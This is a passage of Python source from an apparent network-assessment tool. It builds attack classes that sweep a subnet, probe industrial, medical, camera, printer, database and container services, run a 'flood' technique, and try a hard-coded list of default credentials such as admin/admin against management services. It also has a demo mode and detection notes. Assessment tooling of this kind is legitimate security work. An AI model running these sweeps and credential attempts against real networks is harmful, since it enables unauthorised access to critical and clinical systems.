                          "the web UI, or run the demo edition")
                ctx.session.end_attempt(attempt, "skipped", reason)
                return AttackOutcome.skipped(reason, reason)

            rounds = 1
            if row.technique == "flood":
                rounds = max(1, int(min(self.budget(ctx, 6.0), 12.0)))
            chosen: Optional[Tuple[ItTarget, bool, str, str, int]] = None
            checked: List[str] = []
            for target in targets:
                request = b""
                follow = b""
                last = b""
                answers = 0
                for _round in range(rounds):
                    try:
                        request = row.build(target)
                    except Exception as exc:              # pragma: no cover - defensive
                        detail = f"request could not be built: {type(exc).__name__}: {exc}"
                        ctx.session.end_attempt(attempt, "failed", detail)
                        return AttackOutcome.failed(detail, detail)
                    answer = self.exchange(ctx, target, request)
                    if answer:
                        answers += 1
                        last = answer
                    if row.follow_up is not None:
                        # a technique that needs a conversation: the request decides what
                        # the second one asks for, and the pair is what the verdict reads
                        follow = self.exchange(ctx, target, row.follow_up(target, request))
                        if follow:
                            answers += 1
                    if rounds > 1 and not ctx.demo:
                        time.sleep(0.05)
                    if ctx.want_stop():
                        break
                if row.follow_up is not None:
                    ok, result, detail = row.verdict(target, request, last, follow)
                else:
                    ok, result, detail = row.verdict(target, request, last)
                if row.technique == "flood":
                    detail = f"{rounds} request(s) sent, {answers} answered"
                    ok = rounds - answers < max(1, rounds)      # a flood always "happens"
                if len(targets) > 1:
                    checked.append(f"{target.hostname or target.ip}: {detail or 'no answer'}")
                if chosen is None or (ok and not chosen[1]):
                    chosen = (target, ok, result, detail, answers)
                if ok:
                    break
            assert chosen is not None
            target, ok, result, detail, answers = chosen
            simulated = bool(ctx.demo)
            if row.technique == "flood":
                detail = (f"{rounds} request(s) sent, {answers} answered"
                          f"{' (simulated)' if simulated else ''}")
            elif len(checked) > 1:
                detail = f"{detail}  [checked {len(checked)} hosts: " \
                         + "; ".join(checked[:4]) + "]"
            proof = row.proof or f"{service.label} answered a real {service.protocol} request"
            headline = f"{self.row_label} on {target.label}"
            if ok:
                summary = f"{proof}: {detail}"
            else:
                summary = (f"no positive result — checked {self.row_label.lower()} and saw "
                           f"{detail or 'no answer'}")
            body = (f"{summary}.  ({target.device_label()}, {target.ip}:{self.port}, "
                    f"{target.profile or 'unknown profile'})"
                    + ("  Simulated: no packet left this host." if simulated else ""))

            if ok:
                self.finding(ctx, ap, headline, body, severity=row.severity,
                             kind=self.name)
                try:
                    ap.remember(self.name, detail, host=target.ip, port=self.port,
                                protocol=service.protocol, device=target.device)
                except Exception:                              # pragma: no cover
                    pass
                ctx.session.end_attempt(attempt, "success", headline, body)
                return AttackOutcome.success(
                    headline, detail=body,
                    extra={"host": target.ip, "port": self.port, "protocol": service.protocol,
                           "device": target.device, "technique": row.technique,
                           "simulated": simulated, "answers": answers,
                           "domain": "it", "severity": row.severity,
                           "finding": headline})
            ctx.session.end_attempt(attempt, "failed", f"{headline}: no positive result", body)
            return AttackOutcome.failed(headline, detail=body,
                                        extra={"host": target.ip, "port": self.port,
                                               "protocol": service.protocol,
                                               "device": target.device,
                                               "technique": row.technique,
                                               "answers": answers, "simulated": simulated,
                                               "domain": "it", "severity": "",
                                               "finding": ""})

    ItServiceAttack.__name__ = "".join(part.title() for part in name.split("_"))
    ItServiceAttack.__qualname__ = ItServiceAttack.__name__
    ItServiceAttack.__doc__ = _attack_doc(service, row)
    ItServiceAttack.name = name
    ItServiceAttack.label = f"{service.label}: {row.label}"
    ItServiceAttack.tool = service.tool
    ItServiceAttack.description = (f"{row.description} {service.description}").strip()
    ItServiceAttack.category = row.category
    ItServiceAttack.noise = row.noise
    ItServiceAttack.impact = row.impact
    ItServiceAttack.severity = row.severity
    ItServiceAttack.detection = row.detection or (
        f"{service.label} traffic from an unexpected host to port {service.port}: "
        f"{row.label.lower()} — a service log or an IDS rule on the protocol sees it")
    ItServiceAttack.requires = ()
    ItServiceAttack.needs_injection = False
    ItServiceAttack.applies_to = ALL
    ItServiceAttack.port = service.port
    ItServiceAttack.domain = "it"
    ItServiceAttack.devices = service.devices
    return ItServiceAttack


# --------------------------------------------------------------------------- #
# cross-cutting attacks: one question asked of the whole segment
# --------------------------------------------------------------------------- #

#: the ports an IT sweep uses when nothing more precise is known: the union of every
#: device type's typical ports, which is a much better starting list than 1-1024.
SWEEP_PORTS: Tuple[int, ...] = tuple(sorted({port for dev in itdev.DEVICE_TYPES
                                             for port in dev.ports} |
                                            {1883, 8883, 5683, 11211, 5000, 5900, 9999,
                                             54321, 8009, 7000, 44818, 20000, 2404, 4840,
                                             47808, 10250, 2375, 6443, 3306, 5432, 9200,
                                             27017, 6379, 161, 5060, 9100, 631, 554, 502,
                                             102, 104, 11112, 4352, 7547, 8008, 9080}))

#: the credential pairs every sweep tries, in the order an installer would have set them
CREDENTIALS: Tuple[Tuple[str, str], ...] = (("admin", "admin"), ("admin", "password"),
                                            ("admin", "1234"), ("root", "root"),
                                            ("admin", "admin123"), ("user", "user"),
                                            ("admin", ""), ("administrator", "administrator"))

#: model prefixes with a public advisory worth naming in the report
ADVISORIES: Tuple[Tuple[str, str, str], ...] = (
    ("Hikvision", "network camera", "CVE-2021-36260: pre-auth command injection (firmware "
     "before 2021-09)"),
    ("Dahua", "network camera", "the 2021 ONVIF-era camera advisories; check the exact "
     "build on the vendor's page"),
    ("Fortinet", "FortiGate", "the SSL-VPN pre-auth advisories of 2018-2024 by firmware"),
    ("MikroTik", "RouterOS", "CVE-2018-14847: Winbox credential disclosure (RouterOS "
     "before 6.42)"),
    ("TP-Link", "Kasa / router", "the Kasa autokey protocol: no authentication by design"),
    ("Xerox", "AltaLink", "CVE-2019-13169 family: the 2019 MFP advisories"),
    ("HP", "LaserJet", "the 2021-2023 printer advisories; PJL is a command line on a port"),
    ("TP-Link", "Omada", "check the controller version against the current advisory list"),
    ("Synology", "DSM", "the DSM advisories by major version (7.x is in support)"),
    ("VMware", "ESXi", "the vCenter/ESXi advisories by build; 7.0 before U3 is exposed"),
    ("Jenkins", "Jenkins", "the weekly security releases: an unauthenticated /api/json "
     "usually means an unpatched LTS"),
    ("Asterisk", "FreePBX", "the FreePBX advisories and the standard toll-fraud exposure"),
    ("Philips", "IntelliVue", "medical device advisories are coordinated: the finding is "
     "the exposed service, not the CVE number"),
)


@dataclass
class Hit:
    """One live service found by a sweep: what answered, and what that means."""

    ip: str
    port: int
    protocol: str
    target: ItTarget
    answer: bytes = b""
    detail: str = ""

    @property
    def label(self) -> str:
        return f"{self.ip}:{self.port}/{self.protocol}"


def _sweep_targets(ctx: AttackContext) -> List[ItTarget]:
    """Every host this run may talk to: the simulated segment, or the /24 under test."""
    config = ctx.config
    if ctx.demo:
        return [ItTarget(ip=host.ip, hostname=host.hostname, vendor=host.vendor,
                         model=host.model, device=host.device, ports=host.ports,
                         profile=host.profile_name, host=host)
                for host in demo_lan().hosts]
    explicit = (getattr(config, "it_host", "") or getattr(config, "gateway_ip", "") or
                getattr(config, "target_ip", "") or "")
    if explicit:
        return [ItTarget(ip=explicit)]
    local = _local_address()
    if not local or local.startswith("127."):
        return []
    return [ItTarget(ip=address) for address in subnet_of(local)]


def _local_address() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect(("8.8.8.8", 53))
            return probe.getsockname()[0]
    except OSError:
        return ""


def _probe_target(ctx: AttackContext, target: ItTarget, port: int, protocol: str,
                  request: bytes, timeout: float = EXCHANGE_TIMEOUT) -> Hit:
    """Ask one host one question, through the same path the table attacks use."""
    if ctx.demo or target.host is not None:
        lan = demo_lan()
        host = target.host or lan.by_ip(target.ip)
        if host is None or (port not in host.ports and port not in SWEEP_PORTS):
            return Hit(target.ip, port, protocol, target)
        answer = lan.respond(host, port, request, protocol)
        detail = ""
        if answer:
            detail = f"{host.profile_name} profile, {len(answer)} bytes back"
        return Hit(target.ip, port, protocol, target, answer, detail)
    transport = "udp" if protocol in ("ssdp", "mdns", "dnp3", "cip", "bacnet", "kasa",
                                      "miio", "coap", "snmp", "ntp", "stun") else "tcp"
    if transport == "tcp" and not tcp_open(target.ip, port, timeout=0.6):
        return Hit(target.ip, port, protocol, target)
    answer = live_exchange(target, port, request, transport, timeout)
    return Hit(target.ip, port, protocol, target, answer,
               f"{len(answer)} bytes back" if answer else "")


class _ItSweep(Attack):
    """Shared skeleton for the segment-wide attacks: sweep, decide, report, once."""

    category = "discovery"
    noise = "quiet"
    impact = "info"
    requires = ()
    needs_injection = False
    applies_to = ALL
    domain = "it"
    devices: Tuple[str, ...] = ()
    severity = "medium"
    #: (protocol, port, request builder) triples this sweep asks about
    probes: Tuple[Tuple[str, int], ...] = ()
    #: the label of the finding when the sweep finds nothing at all
    empty_finding = "nothing answered the sweep"

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def available(self, ctx: AttackContext) -> bool:
        return True

    def request_for(self, protocol: str) -> bytes:
        return b""

    def interrogate(self, ctx: AttackContext, hit: Hit) -> Hit:
        """Turn a bare answer into a described hit; the sweeps override this."""
        return hit

    def summarise(self, ctx: AttackContext, hits: List[Hit]) -> Tuple[str, str]:
        found = ", ".join(hit.label for hit in hits[:8])
        return (f"{self.label}: {len(hits)} service(s) answered",
                f"{found}{' …' if len(hits) > 8 else ''}")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(
            self.name, ap.bssid, tool=self.tool,
            chosen_by=getattr(ap, "picked_by", "operator"),
            reason=getattr(ap, "pick_reason", ""))
        targets = _sweep_targets(ctx)
        if not targets:
            reason = ("no segment to sweep: set it_host (or gateway_ip) to an address on "
                      "the network under test, or run the demo edition")
            ctx.session.end_attempt(attempt, "skipped", reason)
            return AttackOutcome.skipped(reason, reason)

        hits: List[Hit] = []
        for target in targets:
            for protocol, port in self.probes:
                hit = _probe_target(ctx, target, port, protocol, self.request_for(protocol))
                if hit.answer:
                    hits.append(self.interrogate(ctx, hit))
            if ctx.want_stop():
                break

        headline, detail = self.summarise(ctx, hits)
        simulated = bool(ctx.demo)
        body = (f"{detail}.  Hosts swept: {len(targets)}"
                + ("  Simulated: the segment is the demo network." if simulated else ""))
        if hits:
            self.finding(ctx, ap, headline, body, severity=self.severity, kind=self.name)
        ctx.session.end_attempt(attempt, "success" if hits else "failed", headline, body)
        payload = {"hosts": len(targets), "hits": len(hits), "simulated": simulated,
                   "services": [hit.label for hit in hits[:24]], "domain": "it",
                   "severity": self.severity if hits else "",
                   "devices": list(getattr(self, "devices", ())),
                   "finding": headline if hits else ""}
        if hits:
            return AttackOutcome.success(headline, detail=body, extra=payload)
        return AttackOutcome.failed(headline, detail=body, extra=payload)


def _sweep_class(name: str, label: str, description: str,
                 probes: Sequence[Tuple[str, int]],
                 request_map: Dict[str, Callable[[ItTarget], bytes]],
                 category: str = "discovery", noise: str = "quiet", impact: str = "info",
                 severity: str = "medium", detection: str = "",
                 devices: Sequence[str] = (), interrogate: Optional[Callable] = None,
                 summarise: Optional[Callable] = None, tool: str = "") -> Type[Attack]:
    """Build one segment-wide attack: same skeleton, its own probes and report."""

    class _Sweep(_ItSweep):
        def request_for(self, protocol: str) -> bytes:
            builder = request_map.get(protocol)
            return builder(ItTarget(ip="0.0.0.0")) if builder else b""

        def interrogate(self, ctx: AttackContext, hit: Hit) -> Hit:
            return interrogate(ctx, hit) if interrogate else hit

    if summarise is not None:                    # attached after the class: a class body
        def _summarise(self, ctx: AttackContext, hits: List[Hit]) -> Tuple[str, str]:
            return summarise(self, ctx, hits)    # cannot see the enclosing scope
        _Sweep.summarise = _summarise

    _Sweep.__name__ = "".join(part.title() for part in name.split("_"))
    _Sweep.__qualname__ = _Sweep.__name__
    _Sweep.__doc__ = description
    _Sweep.name = name
    _Sweep.label = label
    _Sweep.description = description
    _Sweep.probes = tuple(probes)
    _Sweep.category = category
    _Sweep.noise = noise
    _Sweep.impact = impact
    _Sweep.severity = severity
    _Sweep.devices = tuple(devices)
    _Sweep.domain = "it"
    _Sweep.needs_injection = False
    _Sweep.requires = ()
    _Sweep.applies_to = ALL
    _Sweep.detection = detection or (f"a sweep of {len(probes)} service port(s) across the "
                                     "segment: connection logs and service logs show one "
                                     "client greeting everything")
    _Sweep.tool = tool or "wifipilot itproto + itsim (real protocol probes)"
    return _Sweep


def _describe_camera(ctx: AttackContext, hit: Hit) -> Hit:
    parsed = proto.parse_rtsp(hit.answer)
    if parsed.get("status"):
        hit.detail = (f"{parsed.get('server', 'camera')} · "
                      f"{'open stream' if parsed.get('status') == 200 else 'challenged'}")
    return hit


def _describe_printer(ctx: AttackContext, hit: Hit) -> Hit:
    parsed = proto.parse_pjl(hit.answer)
    hit.detail = parsed.get("model", "") or parsed.get("text", "")[:40]
    return hit


def _describe_plc(ctx: AttackContext, hit: Hit) -> Hit:
    parsed = proto.parse_modbus(hit.answer)
    registers = parsed.get("registers") or []
    hit.detail = (f"{parsed.get('function_name', 'modbus')}: "
                  f"{len(registers)} register(s)" if registers else
                  parsed.get("device_id", "") or parsed.get("exception_name", "answered"))
    return hit


def _describe_database(ctx: AttackContext, hit: Hit) -> Hit:
    if hit.protocol == "redis":
        parsed = proto.parse_resp(hit.answer)
        hit.detail = ("no password" if not parsed.get("auth_required") else "password set")
    elif hit.protocol == "mongo":
        parsed = proto.parse_mongo(hit.answer)
        hit.detail = f"wire {parsed.get('max_wire', 0)}"
    else:
        parsed = proto.parse_http_response(hit.answer)
        hit.detail = f"HTTP {parsed.get('status')}"
    return hit


def _describe_container(ctx: AttackContext, hit: Hit) -> Hit:
    payload = proto.parse_json_body(proto.parse_http_response(hit.answer)["body_bytes"])
    hit.detail = (f"API {payload.get('ApiVersion', payload.get('gitVersion', ''))}"
                  if payload else "answered")
    return hit


def _describe_voip(ctx: AttackContext, hit: Hit) -> Hit:
    parsed = proto.parse_sip(hit.answer)
    hit.detail = (f"status {parsed.get('status')} · {parsed.get('server', '')}").strip(" ·")
    return hit


def _describe_smart(ctx: AttackContext, hit: Hit) -> Hit:
    if hit.protocol == "kasa":
        parsed = proto.parse_kasa(hit.answer)
        hit.detail = f"{parsed.get('model', '')} relay={parsed.get('relay_state')}"
    elif hit.protocol == "miio":
        hit.detail = f"device id {proto.parse_miio_hello(hit.answer).get('device_id')}"
    else:
        hit.detail = proto.parse_cast_message(hit.answer).get("namespace", "answered")
    return hit


SWEEP_ATTACKS: List[type] = [
    _sweep_class(
        "it_host_discovery", "IT host discovery sweep",
        "Walk the segment's service ports with a real connect and report every host that "
        "answers: the inventory every other attack depends on.",
        tuple((PROTOCOL_FOR_PORT.get(port, "http"), port)
              for port in (22, 80, 443, 445, 554, 631, 161, 9100, 3389, 8080, 8443)),
        {"http": lambda t: proto.http_request("", "/", "HEAD", 80),
         "ssh": lambda t: proto.ssh_kexinit(), "pjl": lambda t: proto.pjl_command("id"),
         "snmp": lambda t: b"", "rdp": lambda t: proto.rdp_negotiation_request(),
         "ipp": lambda t: proto.ipp_get_printer_attributes(),
         "rtsp": lambda t: proto.rtsp_request("OPTIONS", "rtsp://x/")},
        severity="info", devices=("router", "printer", "nas", "windows_server", "switch")),
    _sweep_class(
        "it_device_inventory", "IT device inventory and typing",
        "Discover the hosts, then classify each one from its ports, its mDNS name and its "
        "banners into a device type — with the evidence for every guess.",
        tuple((PROTOCOL_FOR_PORT.get(port, "http"), port)
              for port in (80, 443, 554, 631, 9100, 5353, 1900, 5000, 8080)),
        {"http": lambda t: proto.http_request("", "/", "GET", 80),
         "mdns": lambda t: proto.dns_query("_services._dns-sd._udp.local", 12, 0),
         "ssdp": lambda t: proto.ssdp_msearch(),
         "rtsp": lambda t: proto.rtsp_request("OPTIONS", "rtsp://x/"),
         "ipp": lambda t: proto.ipp_get_printer_attributes(),
         "pjl": lambda t: proto.pjl_command("id")},
        severity="info", devices=()),
    _sweep_class(
        "it_port_exposure", "IT port exposure sweep",
        "The full IT port list against the segment: which services a device exposes is "
        "the first sentence of its exposure, and the report names them by purpose.",
        tuple((PROTOCOL_FOR_PORT.get(port, "http"), port) for port in SWEEP_PORTS),
        {"http": lambda t: proto.http_request("", "/", "HEAD", 80),
         "telnet": lambda t: proto.telnet_banner(), "ssh": lambda t: proto.ssh_kexinit(),
         "pjl": lambda t: proto.pjl_command("id"), "modbus": lambda t: proto.modbus_request(3),
         "rtsp": lambda t: proto.rtsp_request("OPTIONS", "rtsp://x/"),
         "redis": lambda t: proto.redis_command("PING"), "mqtt": lambda t: proto.mqtt_connect(),
         "coap": lambda t: proto.coap_packet(1, "/.well-known/core"),
         "ldap": lambda t: proto.ldap_search_request("", 0),
         "snmp": lambda t: b"", "rdp": lambda t: proto.rdp_negotiation_request(),
         "vnc": lambda t: proto.vnc_version(), "adb": lambda t: proto.adb_connect(),
         "kasa": lambda t: proto.kasa_command(), "miio": lambda t: proto.miio_hello(),
         "cast": lambda t: proto.cast_message(), "dicom": lambda t: proto.dicom_associate(),
         "s7comm": lambda t: proto.s7_connect_request(), "cip": lambda t: proto.cip_list_identity(),
         "dnp3": lambda t: proto.dnp3_reset_link(), "iec104": lambda t: proto.iec104_start(),
         "opcua": lambda t: proto.opcua_hello(), "bacnet": lambda t: proto.bacnet_who_is(),
         "sip": lambda t: proto.sip_request("OPTIONS", "sip:x"),
         "smb": lambda t: proto.smb2_negotiate(), "postgres": lambda t: proto.postgres_startup(),
         "mysql": lambda t: b"\x0a\x00\x00\x01", "rsync": lambda t: proto.rsync_hello(),
         "ftp": lambda t: b"", "ssdp": lambda t: proto.ssdp_msearch(),
         "mdns": lambda t: proto.dns_query("local", 1, 0), "ipp": lambda t: proto.ipp_get_printer_attributes()},
        category="discovery", severity="info"),
    _sweep_class(
        "it_cleartext_service_audit", "cleartext service audit",
        "Which of the segment's services still speak in the clear where a credential "
        "travels: FTP, telnet, HTTP management, SIP and MQTT without TLS.",
        (("ftp", 21), ("telnet", 23), ("http", 80), ("sip", 5060), ("mqtt", 1883),
         ("http", 8080), ("redis", 6379)),
        {"ftp": lambda t: b"", "telnet": lambda t: proto.telnet_banner(),
         "http": lambda t: proto.http_request("", "/", "GET", 80),
         "sip": lambda t: proto.sip_request("OPTIONS", "sip:x"),
         "mqtt": lambda t: proto.mqtt_connect(), "redis": lambda t: proto.redis_command("PING")},
        severity="medium"),
    _sweep_class(
        "it_default_credential_sweep", "default credential sweep",
        "The standard installer credential list against every management service found, "
        "one attempt each: the most productive five minutes of an internal assessment.",
        (("http", 80), ("http", 8080), ("http", 443), ("ftp", 21), ("sip", 5060),
         ("mqtt", 1883), ("redis", 6379)),
        {"http": lambda t: proto.http_request(t.ip or "", "/admin", "GET", 80,
                                              basic=("admin", "admin")),
         "ftp": lambda t: proto.ftp_login("admin", "admin"),
         "sip": lambda t: proto.sip_register("sip:x", "100", "100"),
         "mqtt": lambda t: proto.mqtt_connect("wp", "admin", "admin"),
         "redis": lambda t: proto.redis_command("INFO", inline=True)},
        category="exploit", noise="moderate", impact="loot", severity="high"),
    _sweep_class(
        "it_firmware_advisory_audit", "firmware advisory audit",
        "Read the model and firmware strings the devices volunteer, and name the public "
        "advisory family each one belongs to.",
        (("http", 80), ("onvif", 80), ("rtsp", 554), ("pjl", 9100), ("http", 8080)),
        {"http": lambda t: proto.http_request("", "/", "GET", 80),
         "onvif": lambda t: proto.onvif_get_device_information(),
         "rtsp": lambda t: proto.rtsp_request("OPTIONS", "rtsp://x/"),
         "pjl": lambda t: proto.pjl_command("config")},
        severity="medium"),
    _sweep_class(
        "it_camera_exposure_audit", "camera and recorder exposure audit",
        "Every camera and recorder on the segment: is the stream open, who made it, and "
        "which firmware is it running.",
        (("rtsp", 554), ("rtsp", 8554), ("onvif", 80), ("http", 8000)),
        {"rtsp": lambda t: proto.rtsp_request("DESCRIBE", "rtsp://x/live"),
         "onvif": lambda t: proto.onvif_get_device_information(),
         "http": lambda t: proto.http_request("", "/", "GET", 8000)},
        severity="high", devices=("ip_camera", "nvr_dvr", "camera_doorbell"),
        interrogate=_describe_camera),
    _sweep_class(
        "it_printer_exposure_audit", "printer and MFP exposure audit",
        "The printers on the segment: PJL answers commands, IPP answers attributes, and "
        "the model and firmware come back in both.",
        (("pjl", 9100), ("ipp", 631), ("http", 80), ("telnet", 23)),
        {"pjl": lambda t: proto.pjl_command("id"), "ipp": lambda t: proto.ipp_get_printer_attributes(),
         "http": lambda t: proto.http_request("", "/", "GET", 80),
         "telnet": lambda t: proto.telnet_banner()},
        severity="high", devices=("printer", "mfp_scanner", "label_printer"),
        interrogate=_describe_printer),
    _sweep_class(
        "it_ot_exposure_audit", "OT / industrial exposure audit",
        "The plant protocols on the segment: Modbus, S7, DNP3, IEC-104, CIP and OPC-UA "
        "answer whoever asks, and each answer is a safety finding.",
        (("modbus", 502), ("s7comm", 102), ("dnp3", 20000), ("iec104", 2404), ("cip", 44818),
         ("opcua", 4840), ("bacnet", 47808)),
        {"modbus": lambda t: proto.modbus_request(43), "s7comm": lambda t: proto.s7_connect_request(),
         "dnp3": lambda t: proto.dnp3_reset_link(), "iec104": lambda t: proto.iec104_start(),
         "cip": lambda t: proto.cip_list_identity(), "opcua": lambda t: proto.opcua_hello(),
         "bacnet": lambda t: proto.bacnet_who_is()},
        severity="critical", devices=("plc", "rtu", "hmi_panel", "energy_meter",
                                      "building_controller"),
        interrogate=_describe_plc),
    _sweep_class(
        "it_medical_device_audit", "medical device exposure audit",
        "DICOM nodes and their association handling: an imaging node that answers an "
        "anonymous association is a clinical data finding.",
        (("dicom", 104), ("dicom", 11112), ("http", 80)),
        {"dicom": lambda t: proto.dicom_associate(),
         "http": lambda t: proto.http_request("", "/", "GET", 80)},
        severity="high", devices=("medical_device",)),
    _sweep_class(
        "it_container_exposure_audit", "container and cluster exposure audit",
        "Container engines and cluster APIs: an API that answers /version without a token "
        "has answered everything else too.",
        (("docker", 2375), ("kubernetes", 6443), ("http", 10250), ("http", 5000)),
        {"docker": lambda t: proto.docker_version(t.ip or "127.0.0.1", 2375),
         "kubernetes": lambda t: proto.k8s_version(t.ip or "127.0.0.1", 6443),
         "http": lambda t: proto.http_request("", "/version", "GET", 10250)},
        severity="critical", devices=("container_host", "hypervisor_host"),
        interrogate=_describe_container),
    _sweep_class(
        "it_database_exposure_audit", "database exposure audit",
        "The data stores on the segment, asked the one question each one answers before "
        "authentication: Redis PING, Mongo hello, Postgres startup, MySQL handshake.",
        (("redis", 6379), ("mongo", 27017), ("elastic", 9200), ("postgres", 5432),
         ("mysql", 3306), ("memcached", 11211)),
        {"redis": lambda t: proto.redis_command("INFO", inline=True),
         "mongo": lambda t: proto.mongo_hello(), "elastic": lambda t: proto.http_json_request(
             t.ip or "127.0.0.1", 9200, "/"),
         "postgres": lambda t: proto.postgres_startup(),
         "mysql": lambda t: b"\x0a\x00\x00\x01\x85\xa2\x03\x00",
         "memcached": lambda t: proto.memcached_command("stats")},
        severity="critical", devices=("database_server", "container_host"),
        interrogate=_describe_database),
    _sweep_class(
        "it_share_enumeration", "file share enumeration",
        "SMB, NFS and rsync on the segment: which of them list their shares, their "
        "exports or their modules to an unauthenticated client.",
        (("smb", 445), ("rsync", 873), ("rpc", 111), ("http", 5000)),
        {"smb": lambda t: proto.smb2_negotiate(), "rsync": lambda t: proto.rsync_hello(),
         "rpc": lambda t: b"", "http": lambda t: proto.http_request("", "/", "GET", 5000)},
        severity="high", devices=("nas", "windows_server", "backup_appliance")),
    _sweep_class(
        "it_voip_exposure_audit", "VoIP exposure audit",
        "Phones and PBXs on the segment: which ones answer OPTIONS, what they name "
        "themselves, and whether they challenge at all.",
        (("sip", 5060), ("http", 80), ("http", 8088)),
        {"sip": lambda t: proto.sip_request("OPTIONS", "sip:x"),
         "http": lambda t: proto.http_request("", "/", "GET", 80)},
        severity="medium", devices=("voip_phone", "pbx", "video_conference"),
        interrogate=_describe_voip),
    _sweep_class(
        "it_smart_home_audit", "smart home and consumer device audit",
        "The consumer devices that answer without authentication: smart plugs on their "
        "published autokey, miIO appliances that hand out their token, casters that take "
        "any LAUNCH.",
        (("kasa", 9999), ("miio", 54321), ("cast", 8009), ("http", 8008), ("http", 55443)),
        {"kasa": lambda t: proto.kasa_command("systeminfo"), "miio": lambda t: proto.miio_hello(),
         "cast": lambda t: proto.cast_message(),
         "http": lambda t: proto.http_request("", "/", "GET", 8008)},
        severity="high", devices=("smart_plug", "smart_bulb", "smart_tv", "robot_vacuum"),
        interrogate=_describe_smart),
    _sweep_class(
        "it_iot_service_census", "IoT service census",
        "Every IoT-flavoured service on the segment in one pass, with the count of hosts "
        "and the purpose of each port — the network diagram nobody has.",
        (("mqtt", 1883), ("coap", 5683), ("ssdp", 1900), ("mdns", 5353), ("http", 80),
         ("kasa", 9999), ("miio", 54321)),
        {"mqtt": lambda t: proto.mqtt_connect(), "coap": lambda t: proto.coap_packet(1, "/"),
         "ssdp": lambda t: proto.ssdp_msearch(), "mdns": lambda t: proto.dns_query("local", 1, 0),
         "http": lambda t: proto.http_request("", "/", "GET", 80),
         "kasa": lambda t: proto.kasa_command("systeminfo"), "miio": lambda t: proto.miio_hello()},
        severity="medium"),
    _sweep_class(
        "it_exposure_report", "segment exposure report",
        "One pass over every IT port and device type, summarised as the report's network "
        "section: what is on this segment, what answers, and what that means.",
        tuple((PROTOCOL_FOR_PORT.get(port, "http"), port) for port in SWEEP_PORTS[:28]),
        {"http": lambda t: proto.http_request("", "/", "HEAD", 80),
         "rtsp": lambda t: proto.rtsp_request("OPTIONS", "rtsp://x/"),
         "pjl": lambda t: proto.pjl_command("id"), "modbus": lambda t: proto.modbus_request(3),
         "redis": lambda t: proto.redis_command("PING"), "mqtt": lambda t: proto.mqtt_connect(),
         "ssh": lambda t: proto.ssh_kexinit(), "vnc": lambda t: proto.vnc_version(),
         "telnet": lambda t: proto.telnet_banner(), "sip": lambda t: proto.sip_request("OPTIONS", "sip:x"),
         "smb": lambda t: proto.smb2_negotiate(), "dicom": lambda t: proto.dicom_associate(),
         "kasa": lambda t: proto.kasa_command(), "miio": lambda t: proto.miio_hello(),
         "bacnet": lambda t: proto.bacnet_who_is(), "dnp3": lambda t: proto.dnp3_reset_link(),
         "iec104": lambda t: proto.iec104_start(), "opcua": lambda t: proto.opcua_hello(),
         "cip": lambda t: proto.cip_list_identity(), "s7comm": lambda t: proto.s7_connect_request(),
         "adb": lambda t: proto.adb_connect(), "cast": lambda t: proto.cast_message(),
         "ldap": lambda t: proto.ldap_search_request("", 0),
         "postgres": lambda t: proto.postgres_startup(), "mysql": lambda t: b"\x0a\x00\x00\x01",
         "rsync": lambda t: proto.rsync_hello(), "coap": lambda t: proto.coap_packet(1, "/"),
         "ssdp": lambda t: proto.ssdp_msearch(), "mdns": lambda t: proto.dns_query("local", 1, 0)},
        severity="info", category="discovery"),
]


# --------------------------------------------------------------------------- #
# registration
# --------------------------------------------------------------------------- #

# --------------------------------------------------------------------------- #
# two techniques that cut across every service
# --------------------------------------------------------------------------- #
# Reading a version and hearing a service answer *without* transport security are two
# findings that apply to nearly every service, and both are decided from the exchange
# the service's own rows already make.  They are generated rather than hand-written so
# that a service added tomorrow gets them for free — and so that the advisory string the
# report quotes stays in one place (:data:`ADVISORIES`).

#: protocols whose credentials or payloads cross the segment in the clear
CLEARTEXT_PROTOCOLS: Tuple[str, ...] = (
    "http_json", "mqtt", "coap", "modbus", "bacnet", "sip", "cast", "mdns", "rtsp",
    "onvif", "ipp", "pjl", "cwmp", "smb", "ldap", "redis", "memcached", "mongo", "kasa",
    "airplay", "adb", "vnc", "pjlink", "dicom", "s7comm", "cip", "dnp3", "iec104",
    "opcua", "postgres", "mysql", "rsync", "miio", "ssdp")


def advisory_for(text: str) -> str:
    """The public advisory a banner points at, or ``""`` when nothing matches.

    Matching is deliberately conservative: a vendor name in the banner is enough to say
    "check the advisories for this product line", and the text names what to check.  It
    claims no CVE where the banner does not justify one.
    """
    lowered = text.lower()
    for vendor, family, advisory in ADVISORIES:
        if vendor.lower() in lowered or family.lower() in lowered:
            return f"{vendor} {family}: {advisory}"
    return ""


def version_audit_row(entry: "Service", base: Row) -> Row:
    """The advisory audit: the same version read, judged against the advisory list."""
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        ok, _result, detail = base.verdict(target, request, response)
        if not ok:
            return False, f"no version banner from {entry.protocol}", detail or "no answer"
        advisory = advisory_for(response.decode("latin-1", "replace"))
        if advisory:
            return True, "version disclosed, with an advisory to check", f"{detail} — {advisory}"
        return True, "version disclosed", (
            f"{detail} — no advisory in this build's list matched the banner; check the "
            "exact build against the vendor's own advisory page")
    return _row("version_audit", f"{entry.label.lower()} version audit", base.build, check,
                parse=base.parse, category="discovery", noise="quiet", impact="info",
                severity="medium",
                description="The version an unauthenticated caller can read is the input "
                            "to every CVE check that follows: this row reads it and maps "
                            "the banner onto the advisory list.",
                detection=f"A version request to {entry.protocol} on port {entry.port} "
                          "from an unexpected host.",
                proof="the service discloses its version to anyone who asks")


def cleartext_audit_row(entry: "Service", base: Row) -> Row:
    """Proof that this service has no transport encryption on this port."""
    def check(target: ItTarget, request: bytes, response: bytes) -> Tuple[bool, str, str]:
        ok, _result, detail = base.verdict(target, request, response)
        if not ok:
            return False, f"{entry.protocol} did not answer", detail or "no answer"
        return True, f"{entry.protocol} answered with no transport encryption", (
            f"{entry.protocol} on port {entry.port} answers in the clear: credentials, "
            f"commands and payloads are readable by anyone on the path ({detail})")
    return _row("cleartext_audit", f"{entry.label.lower()} without encryption", base.build,
                check, parse=base.parse, category="exploit", noise="quiet", impact="loot",
                severity="medium",
                description=f"{entry.protocol} has no TLS on this port by design or by "
                            "default, so the session is readable and, on the services "
                            "that authenticate, the credentials are too.",
                detection=f"A {entry.protocol} handshake on port {entry.port} to "
                          "an unexpected host.",
                proof="the service carries its traffic unencrypted")


def _derive_cross_cutting_rows() -> None:
